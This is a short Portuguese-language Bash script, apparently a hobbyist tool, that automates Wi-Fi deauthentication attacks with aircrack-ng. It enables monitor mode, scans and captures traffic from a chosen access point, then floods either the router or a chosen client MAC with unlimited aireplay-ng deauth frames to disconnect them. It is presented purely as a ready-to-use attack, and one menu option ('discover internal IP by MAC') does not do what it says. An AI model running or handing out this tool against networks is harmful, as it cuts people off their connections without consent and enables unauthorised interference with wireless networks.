#!/bin/bash
# Script para desconectar alguém da rede by euayellow
clear
echo "      -=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo "            Script aireplay  "
echo "            by: EuaYellow          " 
echo "      -=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo

	echo "{+}>>  Escolha um wireless: ";
echo
echo
         	 	iwconfig | grep 'wlan'  | awk '{print $1}'
echo
echo
read -p "   {+}>> " rede





clear 
echo
echo "  {1}>> Ver redes WI-FI"
echo "  {2}>> Conectar ao roteador"
echo "  {3}>> Sair"
echo
read -p "   {+}>> " num
#


airmon-ng start $rede
clear
if [ "$num" = "1" ];then
clear
airodump-ng "$rede"mon 
echo "Conectar ao roteador:"
echo 
echo 
read -p "  {+}BSSID>>" route_bssid
echo
read -p "	{+}Channel>>" route_c
clear
airodump-ng --bssid $route_bssid -c $route_c "$rede"mon -w /root/Wifi-Lost/Dados/$route_bssid --ignore-negative-one 
fi

if  [ "$num" = "2" ];then
echo
echo
echo "Conectar ao roteador:"
echo
echo
read -p " {+}BSSID>> " route_bssid
echo
read -p "	{+}Channel>> " route_c
clear
fi

RP=2
 while [ "$RP" != "1" ]
do
airodump-ng --bssid $route_bssid -c $route_c "$rede"mon -w /root/Wifi-Lost/Dados/$route_bssid --ignore-negative-one 
echo
echo
echo "  {1}>> Atacar o roteador com DDos"
echo "  {2}>> Atacar um dispositivo do roteador"
echo "  {3}>> Descobrir IP interno do dispositivo pelo MAC"
echo 
echo
read -p "   {+}>> " num1
echo
echo

#opcçao_1
if [ "$num1" = "1" ];then

aireplay-ng --deauth 0  -a  $route_bssid   "$rede"mon --ignore-negative-one 
clear
fi

#Opcao_2
if [ "$num1" = "2" ];then
read -p "  {+}Qual o MAC do aparelho>> " mac
clear
qterminal -e aireplay-ng --deauth 0  -a  $route_bssid  -c  $mac  "$rede"mon --ignore-negative-one 
clear
fi

if [ "$num1" = "3" ];then
airmon-ng stop "$rede"mon
clear
fi
echo
echo
echo "  {1} Voltar"
echo "  {2} Sair"
echo
echo
read -p "   {+}>>" RP
echo
echo
clear
if [ "$RP" != "2" ];then
airmon-ng stop "$rede"mon
fi
done




if [ "$num" = "3" ];then
clear
exit
fi
exit

